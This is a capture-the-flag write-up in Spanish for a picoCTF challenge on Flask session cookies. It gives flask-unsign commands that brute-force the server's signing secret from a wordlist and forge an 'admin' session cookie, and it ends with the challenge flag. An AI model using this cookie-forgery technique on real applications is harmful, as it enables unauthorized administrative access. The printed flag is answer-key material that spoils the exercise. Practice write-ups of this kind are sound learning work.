Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
Hints
- How secure is a flask cookie?
# Solucion
Este problema requiere cambiar la carga útil en el JWT. Conociendo los secretos posibles de server.py, se puede forzar usando flask-unsign. 
Para descargarlo en la terminal de linux se usa:
apt-get update
apt install python3-pip
pip install flask-unsign
En el archivo server.py separamos todas las posibles cookies en un .txt lo nombramos como keys,
luego se ingresa al sitio web y en el apartado de cookies copiamos la cookie de session y ejecutamos el siguiente comando union el archivo de texto, la cookie y el comando flask.unsign -u -c:
flask-unsign -u-c eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z3JzQ.v9mB8iXN4AQ3szo22z9rOlbRseU -w
keys.txt
Al ejecutarlo aparece la secret key, en mi caso fue fortune,  la cual vamos a poner junto con el siguiente comando:
flask-unsign -s -c "{'very_auth' : 'admin'}" -S fortune
Asi aparece la cookie jwt, la cual vamos a editarla en la cookie de session del sitio web y refrescar la pagina, de esa manera aparece la bandera:
`picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}`
